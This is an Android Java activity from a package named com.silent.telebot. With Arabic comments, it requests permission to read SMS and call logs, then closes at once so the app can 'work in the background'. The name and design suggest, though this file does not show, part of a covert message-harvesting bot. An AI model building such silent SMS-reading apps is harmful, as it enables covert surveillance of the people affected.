package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. إذا كان الإصدار قديماً (أقل من مارشيملو)، الأذونات تمنح تلقائياً عند التثبيت
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            finish();
            return;
        }

        // 2. تحقق إذا كانت الأذونات ممنوحة بالفعل
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            // ممنوحة مسبقاً → أنهي النشاط (التطبيق جاهز للعمل في الخلفية)
            finish();
            return;
        }

        // 3. اطلب الأذونات (سيظهر مربع حوار للمستخدم)
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS
        }, REQ_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // المستخدم وافق ✅
                Toast.makeText(this, "✅ الأذونات ممنوحة، التطبيق يعمل الآن", Toast.LENGTH_SHORT).show();
            } else {
                // المستخدم رفض ❌
                Toast.makeText(this, "❌ الأذونات مرفوضة، التطبيق لن يعمل بشكل صحيح", Toast.LENGTH_LONG).show();
            }
        }
        // أنهِ النشاط بعد طلب الأذونات (سواء وافق أو رفض)
        finish();
    }
}
